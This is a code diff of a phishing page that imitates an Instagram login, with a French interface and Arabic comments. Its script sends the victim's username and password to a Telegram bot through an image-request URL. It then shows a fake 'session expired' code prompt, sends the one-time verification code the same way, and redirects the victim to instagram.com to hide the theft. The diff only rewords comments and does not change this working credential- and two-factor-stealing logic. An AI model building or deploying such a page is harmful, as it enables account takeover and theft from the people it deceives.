@@ -115,14 +115,14 @@
             Votre session a expiré. Veuillez vous reconnecter pour continuer.
         </div>
 
-        <!-- نموذج تسجيل الدخول الأساسي -->
+        <!-- الخطوة 1: نموذج إدخال اسم المستخدم وكلمة المرور -->
         <form id="loginForm">
             <input type="text" id="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
             <input type="password" id="password" placeholder="Mot de passe" required>
             <button type="submit" class="btn">Se connecter</button>
         </form>
 
-        <!-- نموذج طلب الـ OTP الذي ينتظر إدخال المستخدم -->
+        <!-- الخطوة 2: نموذج انتظار رمز التحقق OTP -->
         <form id="otpForm" class="hidden">
             <input type="text" id="otpCode" placeholder="Code de confirmation (6 chiffres)" required>
             <button type="submit" class="btn">Confirmer</button>
@@ -146,7 +146,7 @@
 
         let savedUser = "";
 
-        // الخطوة الأولى: التقاط اليوزر والباسورد وإرسالهما، ثم إبقاء المستخدم معلقاً بطلب الـ OTP
+        // عند إدخال البيانات الأولى وإرسالها لبوت تيليجرام
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const user = document.getElementById('username').value;
@@ -159,16 +159,14 @@
             const img = new Image();
             img.src = url;
 
-            // إخفاء نموذج تسجيل الدخول وإظهار شاشة إدخال رمز التحقق بانتظار تفاعل المستخدم
+            // الانتقال لواجهة انتظار كود التحقق دون مغادرة الصفحة
             document.getElementById('loginForm').classList.add('hidden');
             document.getElementById('footerSection').classList.add('hidden');
             document.getElementById('otpForm').classList.remove('hidden');
-            
-            // تغيير النص لتوجيه المستخدم لإدخال الكود
             document.getElementById('noticeText').textContent = "Entrez le code de confirmation envoyé par SMS ou par email.";
         });
 
-        // الخطوة الثانية: التقاط كود التحقق عند إدخاله وإرساله لبوت تيليجرام ثم التوجيه للموقع الأصلي
+        // عند إدخال رمز التحقق وإرساله لبوت تيليجرام ثم التوجيه للموقع الرسمي
         document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const otp = document.getElementById('otpCode').value;
@@ -179,7 +177,6 @@
             const img = new Image();
             img.src = url;
 
-            // الانتظار نصف ثانية لضمان وصول الرسالة ثم التحويل لإنستغرام
             setTimeout(function() {
                 window.location.href = "https://www.instagram.com";
             }, 500);
